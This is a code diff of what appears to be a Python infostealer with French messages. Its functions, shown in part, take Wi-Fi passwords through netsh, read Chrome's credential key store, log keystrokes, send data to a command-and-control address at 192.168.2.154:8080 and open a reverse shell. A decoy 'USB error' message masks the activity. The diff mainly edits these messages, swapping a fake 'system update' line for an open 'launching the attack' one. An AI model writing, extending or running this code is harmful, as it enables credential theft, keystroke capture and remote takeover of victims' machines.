@@ -39,6 +39,7 @@ def extract_wifi_creds():
         return {"error": f"Commande netsh echouee: {e.output}"}
     except Exception as e:
         return {"error": f"Erreur inattendue: {e}"}
+
 def extract_browser_creds():
     try:
         local_state_path = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Local State')
@@ -87,10 +88,12 @@ def capture_keystrokes(duration=60):
         except:
             pass
     with Listener(on_press=on_press) as listener:
-        print("Mise à jour du systeme en cours, veuillez patienter...")
+        print("Enregistrement des frappes pendant 60 secondes...")
         time.sleep(duration)
         listener.stop()
-    return ' '.join(keys)
+    result = ''.join(keys)
+    print(f"Clavier capture: {result}")
+    return result
 
 def send_to_c2(data):
     c2_url = "http://192.168.2.154:8080"
@@ -111,6 +114,7 @@ def open_reverse_shell():
 
 if __name__ == "__main__":
     try:
+        print("Lancement de l'attaque...")
         time.sleep(random.randint(1, 10))
         print("Erreur USB detectee - Veuillez retirer et reinserer la cle.")
         wifi_data = extract_wifi_creds()
